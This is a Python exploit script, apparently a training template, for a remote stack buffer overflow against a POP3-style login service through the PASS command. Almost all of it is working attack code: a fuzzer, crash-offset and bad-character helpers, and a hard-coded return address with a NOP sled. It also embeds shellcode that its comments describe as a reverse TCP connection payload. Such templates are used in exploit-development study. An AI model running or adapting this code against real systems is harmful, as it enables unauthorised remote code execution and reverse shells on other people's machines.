# This script can be modified to work with other vulnerable services
# Editing the shellcode is mandatory to make this script work, check out the overflow() function too 

#!/usr/bin/python
import sys
import socket
import traceback
import time

# Print info about this script in case of bad usage
def printInfo():
    print "-------------------------------------------------------------------------"
    print "For fuzzing"
    print "\tUsage  : python " + sys.argv[0] + " <targetIP> (<port>)"
    print "\tExample: python " + sys.argv[0] + " 10.13.21.44 110\n"

    print "For crash replication"
    print "\tUsage  : python " + sys.argv[0] + " <targetIP> <port> <buffersize>"
    print "\tExample: python " + sys.argv[0] + " <targetIP> <port> <bufferSize>"

    print "\nTo use a custom buffer"
    print "\tUsage  : python " + sys.argv[0] + " pattern <targetIP> <port> <pattern>"
    print "\tExample: python " + sys.argv[0] + " pattern 10.13.21.44 110 AAAAAAAAAAAAAAAAAAAAAAAAAAABBBB"
    print "\tExample: python " + sys.argv[0] + " pattern 10.13.21.44 110 `python -c 'print \"A\"*2606 + \"\\x8f\\x35\\x4a\\x5f\" + \"C\"*(3500-2610)'`"

    print "\n\nTo use the below functions, you'll need to edit this exploit file with custom bad characters/shellcode\n"
    print "To find bad characters"
    print "\tUsage  : python " + sys.argv[0] + " badchars <targetIP> <port> <pattern>"
    print "\tExample: python " + sys.argv[0] + " badchars 10.13.21.44 110 AAAAAAAAAAAAAAAAAAAAAAAAAAABBBB"

    print "\nTo send the actual shellcode"
    print "\tUsage  : python " + sys.argv[0] + " shellcode <targetIP> <port> <pattern> <padding> (padding can be some random character)"
    print "\tExample: python " + sys.argv[0] + " shellcode 10.13.21.44 110 AAAAAAAAAAAAAAAAAAAAAAAAAAABBBB CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC"
    print "\tExample: python " + sys.argv[0] + " shellcode 10.13.21.44 110 `python -c 'print \"A\"*2606 + \"\\x8f\\x35\\x4a\\x5f\" + \"\\x90\"*20'` `python -c 'print \"C\"*(3500-2606-10-341)'`"
    print "-------------------------------------------------------------------------"
###

# Full badchars list
#badchars = (
#    "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
#    "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
#    "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
#    "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
#    "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
#    "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
#    "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
#    "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
#)


# Edit this list to filter out bad chars
badchars = (
    "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
    "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
    "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
    "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
    "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
    "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
    "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
    "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

# Edit this shellcode, which is your evil payload (currently a reverse tcp connection)
# This exploit won't work unless you replace it with your own payload (use msfvenom unstaged payload)
shellcode =  ""
shellcode += "\xbf\xf4\xee\xb0\x92\xda\xd2\xd9\x74\x24\xf4\x5e"
shellcode += "\x2b\xc9\xb1\x12\x31\x7e\x12\x83\xc6\x04\x03\x8a"
shellcode += "\xe0\x52\x67\x43\x26\x65\x6b\xf0\x9b\xd9\x06\xf4"
shellcode += "\x92\x3f\x66\x9e\x69\x3f\x14\x07\xc2\x7f\xd6\x37"
shellcode += "\x6b\xf9\x11\x5f\xac\x51\xe1\x11\x44\xa0\xe2\x2c"
shellcode += "\x2e\x2d\x03\x9e\x36\x7e\x95\x8d\x05\x7d\x9c\xd0"
shellcode += "\xa7\x02\xcc\x7a\x56\x2c\x82\x12\xce\x1d\x4b\x80"
shellcode += "\x67\xeb\x70\x16\x2b\x62\x97\x26\xc0\xb9\xd8"

global targetIP
global port
global pattern
global padding
global bufferSize

if len(sys.argv) < 3 or sys.argv[1] == "-h":
    printInfo()
    sys.exit(0)
###

targetIP = sys.argv[1]
port = sys.argv[2]

# Script must know how what args are given beforehand
if sys.argv[1] == "pattern" or sys.argv[1] == "badchars":
    targetIP = sys.argv[2]
    port = sys.argv[3]
    pattern = sys.argv[4]

elif sys.argv[1] == "shellcode":
    targetIP = sys.argv[2]
    port = sys.argv[3]
    pattern = sys.argv[4]
    padding = sys.argv[5]

elif len(sys.argv) == 4:
    bufferSize = sys.argv[3]
###


# The function to actually fuzz the service until it crashes
# Use this to find out the rough location of the crash
def fuzz():
    buff = ["A"]
    counter = 100

    while len(buff) <= 30:
        buff.append("A" * counter)
        counter = counter + 200
    ###
    
    for string in buff:
        print "Fuzzing target with %s bytes" %len(string)
        time.sleep(0.5)
        try:
            overflow(string)
        except:
            print "Target server crashed"
            sys.exit(0)
        ###
    ###
###


# The function to send a buffer of a set size to the service
# Use this function to replicate the crash 
def replicateCrash(bufferSize):
    buff = "A" * int(bufferSize)

    try:
        print "\nSending evil buffer with %s bytes" %bufferSize
        overflow(buff)
        print "Done!"
    except:
        print "Could not connect to target server!"
###


# The function to be used with a custom buffer (pattern_create)
# Use this function to locate the exact crash location
def findCrash(buff):
    try:
        print "\nSending evil buffer:\n%s" %buff
        overflow(str(buff))
        print "Done!"
    except:
        #traceback.print_exc()
        print "Could not connect to target server!"
###

# The function to detect bad characters
# Edit the uncommented 'badchars' list 
# and redo the exploit to see the result
def findBadChars(buff):
    try:
        print "\nSending evil buffer:"
        payload = buff + badchars
        print payload

        overflow(payload)
    except:
        #traceback.print_exc()
        print "Could not connect to target server!"
###

# The function to send shellcode to the target
# Use this function to actually do the remote BOF
# Set up a handler/ncat listener before executing this
# Order of payload: buffer, jmp esp, nopsled, padding
def sendShellcode(buff, padding):
    try:
        print "\nSending shellcode:"
        payload = buff + shellcode + padding
        print payload

        overflow(payload)
    except:
        traceback.print_exc()
        print "Could not connect to target"
###

# The function to actually connect and try to login to the server
# This function may differ depending on the target service
def overflow(payload):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect((targetIP, int(port)))
    s.recv(1024)
    s.send("USER test\r\n")
    s.recv(1024)
    s.send("PASS " + str(payload) + "\r\n")
    s.send("QUIT\r\n")
    s.close()
###

# The main function
def main():
    # Check parameters
    if sys.argv[1] == "pattern":
        findCrash(pattern)
        sys.exit(0)

    elif sys.argv[1] == "badchars":
        findBadChars(pattern)
        sys.exit(0)

    elif sys.argv[1] == "shellcode":
        sendShellcode(pattern, padding)
        sys.exit(0)

    elif len(sys.argv) == 3:
        fuzz()
        sys.exit(0)

    elif len(sys.argv) == 4:
        replicateCrash(bufferSize)
        sys.exit(0)

    else:
        printInfo()
        sys.exit(0)
###

main()
